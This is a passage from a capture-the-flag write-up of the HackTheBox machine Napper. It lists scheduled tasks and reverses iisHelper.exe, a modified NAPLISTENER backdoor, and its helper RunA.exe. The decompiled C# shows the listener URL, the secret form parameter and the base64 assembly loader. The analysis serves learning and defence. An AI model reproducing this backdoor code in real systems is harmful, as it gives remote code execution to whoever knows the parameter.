\Microsoft\Windows\Servicing\                  StartComponentCleanup             Ready
\Microsoft\Windows\SettingSync\                BackgroundUploadTask              Ready
\Microsoft\Windows\SettingSync\                NetworkStateChangeTask            Ready
\Microsoft\Windows\SharedPC\                   Account Cleanup                   Disabled
\Microsoft\Windows\Shell\                      CreateObjectTask                  Ready
\Microsoft\Windows\Shell\                      FamilySafetyMonitor               Ready
\Microsoft\Windows\Shell\                      FamilySafetyRefreshTask           Ready
\Microsoft\Windows\Shell\                      IndexerAutomaticMaintenance       Ready
\Microsoft\Windows\Shell\                      ThemesSyncedImageDownload         Ready
\Microsoft\Windows\Shell\                      UpdateUserPictureTask             Ready
\Microsoft\Windows\SoftwareProtectionPlatform\ SvcRestartTask                    Ready
\Microsoft\Windows\SoftwareProtectionPlatform\ SvcRestartTaskLogon               Ready
\Microsoft\Windows\SoftwareProtectionPlatform\ SvcRestartTaskNetwork             Ready
\Microsoft\Windows\SpacePort\                  SpaceAgentTask                    Ready
\Microsoft\Windows\SpacePort\                  SpaceManagerTask                  Ready
\Microsoft\Windows\Speech\                     SpeechModelDownloadTask           Ready
\Microsoft\Windows\StateRepository\            MaintenanceTasks                  Ready
\Microsoft\Windows\Storage Tiers Management\   Storage Tiers Management Initi... Ready
\Microsoft\Windows\Storage Tiers Management\   Storage Tiers Optimization        Disabled
\Microsoft\Windows\Subscription\               EnableLicenseAcquisition          Ready
\Microsoft\Windows\Subscription\               LicenseAcquisition                Disabled
\Microsoft\Windows\Sysmain\                    HybridDriveCachePrepopulate       Disabled
\Microsoft\Windows\Sysmain\                    HybridDriveCacheRebalance         Disabled
\Microsoft\Windows\Sysmain\                    ResPriStaticDbSync                Ready
\Microsoft\Windows\Sysmain\                    WsSwapAssessmentTask              Ready
\Microsoft\Windows\SystemRestore\              SR                                Disabled
\Microsoft\Windows\Task Manager\               Interactive                       Ready
\Microsoft\Windows\TextServicesFramework\      MsCtfMonitor                      Ready
\Microsoft\Windows\Time Synchronization\       ForceSynchronizeTime              Ready
\Microsoft\Windows\Time Synchronization\       SynchronizeTime                   Ready
\Microsoft\Windows\Time Zone\                  SynchronizeTimeZone               Ready
\Microsoft\Windows\TPM\                        Tpm-HASCertRetr                   Ready
\Microsoft\Windows\TPM\                        Tpm-Maintenance                   Ready
\Microsoft\Windows\UNP\                        RunUpdateNotificationMgr          Disabled
\Microsoft\Windows\UpdateOrchestrator\         MusUx_UpdateInterval              Ready
\Microsoft\Windows\UpdateOrchestrator\         Reboot_AC                         Disabled
\Microsoft\Windows\UpdateOrchestrator\         Reboot_Battery                    Disabled
\Microsoft\Windows\UpdateOrchestrator\         Report policies                   Ready
\Microsoft\Windows\UpdateOrchestrator\         Schedule Maintenance Work         Disabled
\Microsoft\Windows\UpdateOrchestrator\         Schedule Scan                     Ready
\Microsoft\Windows\UpdateOrchestrator\         Schedule Scan Static Task         Ready
\Microsoft\Windows\UpdateOrchestrator\         Schedule Wake To Work             Disabled
\Microsoft\Windows\UpdateOrchestrator\         Schedule Work                     Disabled
\Microsoft\Windows\UpdateOrchestrator\         UpdateModelTask                   Ready
\Microsoft\Windows\UpdateOrchestrator\         USO_UxBroker                      Ready
\Microsoft\Windows\UPnP\                       UPnPHostConfig                    Ready
\Microsoft\Windows\USB\                        Usb-Notifications                 Ready
\Microsoft\Windows\User Profile Service\       HiveUploadTask                    Disabled
\Microsoft\Windows\WaaSMedic\                  PerformRemediation                Ready
\Microsoft\Windows\WCM\                        WiFiTask                          Ready
\Microsoft\Windows\WDI\                        ResolutionHost                    Ready
\Microsoft\Windows\Windows Error Reporting\    QueueReporting                    Ready
\Microsoft\Windows\Windows Filtering Platform\ BfeOnServiceStartTypeChange       Ready
\Microsoft\Windows\WindowsColorSystem\         Calibration Loader                Ready
\Microsoft\Windows\WindowsUpdate\              Refresh Group Policy Cache        Ready
\Microsoft\Windows\WindowsUpdate\              Scheduled Start                   Ready
\Microsoft\Windows\WindowsUpdate\RUXIM\        PLUGScheduler                     Ready
\Microsoft\Windows\Wininet\                    CacheTask                         Ready
\Microsoft\Windows\WlanSvc\                    CDSSync                           Ready
\Microsoft\Windows\WOF\                        WIM-Hash-Management               Ready
\Microsoft\Windows\WOF\                        WIM-Hash-Validation               Ready
\Microsoft\Windows\Work Folders\               Work Folders Logon Synchroniza... Ready
\Microsoft\Windows\Work Folders\               Work Folders Maintenance Work     Ready
\Microsoft\Windows\Workplace Join\             Automatic-Device-Join             Disabled
\Microsoft\Windows\Workplace Join\             Device-Sync                       Disabled
\Microsoft\Windows\Workplace Join\             Recovery-Check                    Disabled
\Microsoft\Windows\WwanSvc\                    NotificationTask                  Ready
\Microsoft\Windows\WwanSvc\                    OobeDiscovery                     Ready
\Microsoft\XblGameSave\                        XblGameSaveTask                   Ready

```

There’s a ton of tasks on any Windows instance, but the two interesting ones are right at the top.

I’ll fetch the details for each. `cleanup` runs a PowerShell script from the Administrator user’s `AppData` directory and runs every 5 minutes (`PT5M` is defined [here](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-interval-repetitiontype-element)):

```

PS C:\> (get-scheduledtask -taskname cleanup).Actions

Id               : 
Arguments        : -File C:\Users\Administrator\AppData\Roaming\System32\clean-up.ps1
Execute          : powershell.exe
WorkingDirectory : C:\Users\Administrator\AppData\Roaming\System32\
PSComputerName   : 
PS C:\> (get-scheduledtask -taskname cleanup).Triggers.Repetition

Duration Interval StopAtDurationEnd PSComputerName
-------- -------- ----------------- --------------
         PT5M                 False 

```

This script is mostly about resetting things. For example, it resets all the Elastic stuff in case that gets messed up by HTB players. The script does invoke `C:\Users\Administrator\AppData\Roaming\System32\napper.exe`, which is exactly the same as `a.exe`. So this is what is doing the password rotation.

`iisHelper` runs a PowerShell script located in the ruben user’s `AppData` directory:

```

PS C:\> (get-scheduledtask -taskname iishelper).Actions

Id               : 
Arguments        : -File C:\Users\ruben\AppData\System32\iis.ps1
Execute          : powershell.exe
WorkingDirectory : 
PSComputerName   : 
PS C:\> (get-scheduledtask -taskname iishelper).Triggers.Repetition

Duration Interval StopAtDurationEnd PSComputerName
-------- -------- ----------------- --------------
         PT1M                 False

```

This one runs every one minute! It’s script is very simple:

```

While(1) {
    Start-Process C:\users\Ruben\appdata\System32\iisHelper.exe -Wait
   }

```

It runs `iisHelper.exe` and waits for it to finish, which it shouldn’t. But if it does crash, it will start right again. And if the script were to crash, the scheduled task would bring it back up on the next run less than a minute later.

### iisHelper.exe

#### Metadata

This binary is a .NET executable:

```

oxdf@hacky$ file iisHelper.exe 
iisHelper.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
oxdf@hacky$ md5sum iisHelper.exe
2c8df4ad6771b3945812b3a4dce4eed1  iisHelper.exe

```

Looking in [VT](https://www.virustotal.com/gui/file/6502f3954b261a6dd19073bcfce691b539fb6c9f5759ea527bf3a59e802a3b1c/details), it is detected as malware by many AV engines:

![image-20240430145336740](/img/image-20240430145336740.png)

Interestingly, it was first submitted to VT only in late April, which suggests it isn’t exactly the same as the binary from the malware reporting from Elastic:

![image-20240430145614393](/img/image-20240430145614393.png)

#### Reversing

I’ll open the binary in [DotPeek](https://www.jetbrains.com/decompiler/), where the assembly gives itself the name `h3`:

![image-20240430145708049](/img/image-20240430145708049.png)

There are four functions inside the `MsEXGHalthd` class. `Main` starts a thread that will run `Listener`:

```

  private static void Main(string[] args)
  {
    HttpContext current = HttpContext.Current;
    Thread thread = new Thread(new ParameterizedThreadStart(MsEXGHealthd.Listener));
    Thread.Sleep(0);
    HttpContext parameter = current;
    thread.Start((object) parameter);
  }

```

This function starts by creating a `HttpListener` object:

```

  public static void Listener(object ctx)
  {
    HttpListener httpListener = new HttpListener();
    try
    {
      if (!HttpListener.IsSupported)
        return;
      string uriPrefix = "https://*:443/ews/MsExgHealthCheckd/";
      httpListener.Prefixes.Add(uriPrefix);
      httpListener.Start();
      byte[] buffer = Convert.FromBase64String("");
      while (true)
      {
...[snip]...
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine("Exception caught2: " + ex.ToString());
      int num = httpListener.IsListening ? 1 : 0;
    }
  }

```

It is listening on the specific malware URL, and then enters an infinite `while` loop.

Inside the loop, there’s a bunch of code to handle parsing the incoming request. Eventually, there’s this bit that checks for the `sdafwe3rwe23` parameter:

```

          HttpResponse response2 = new HttpResponse((TextWriter) new StreamWriter(response1.OutputStream));
          HttpContext httpContext = new HttpContext(request2, response2);
          if (request2.Form["sdafwe3rwe23"] != null)
          {
...[snip]...
          }
          else
          {
            response1.StatusCode = 404;
            response1.ContentLength64 = (long) buffer.Length;
            stream = response1.OutputStream;
            stream.Write(buffer, 0, buffer.Length);
          }

```

If it’s not found, it returns 404. If it is found, it processes it by saving the value to a temp file, and then calling `RunA.exe [temp filename]`:

```

            string contents = request2.Form["sdafwe3rwe23"];
            string tempFileName = Path.GetTempFileName();
            System.IO.File.WriteAllText(tempFileName, contents);
            new Process()
            {
              StartInfo = {
                FileName = "cmd.exe",
                Arguments = ("/c c:\\users\\ruben\\appdata\\System32\\RunA.exe " + tempFileName)
              }
            }.Start();
            Thread.Sleep(100);
            response1.StatusCode = 200;
            response1.ContentLength64 = (long) buffer.Length;
            stream = response1.OutputStream;
            stream.Write(buffer, 0, buffer.Length);
            if (stream != null)
            {
              stream.Flush();
              stream.Close();
            }
            response1.OutputStream.Flush();
            response1.OutputStream.Close();

```

That explains why the hash is unique to Napper. It’s been modified to what it does next. The screenshot in the [Elastic Post](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph) showed it was called directly from this malware. I suspect the original malware was having issues when multiple players were trying to use it at the same time, so this modification was made so that each players request would start a new process and their shells would not hang the backdoor for other players.

#### RunA.exe

[DotPeek](https://www.jetbrains.com/decompiler/) works on `RunA.exe` as well. It’s *very* simple:

![image-20240430162725217](/img/image-20240430162725217.png)

`Main` handles the base64-decode, loading it as an Assembly, and then running the `Run()` constructor:

```

namespace RunA
{
  internal class Program
  {
    private static void Main(string[] args)
    {
      if (args.Length == 0)
      {
        Console.WriteLine("Please provide the path to the DLL as a command line argument.");
      }
      else
      {
        Assembly assembly = Assembly.Load(Convert.FromBase64String(File.ReadAllText(args[0])));
        object obj = new object();
        Console.WriteLine("hereA");
        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(obj);
        Console.WriteLine("here");
        Thread.Sleep(29);
      }
    }
  }
}

```

[gftrace »](/2024/05/07/gftrace.html)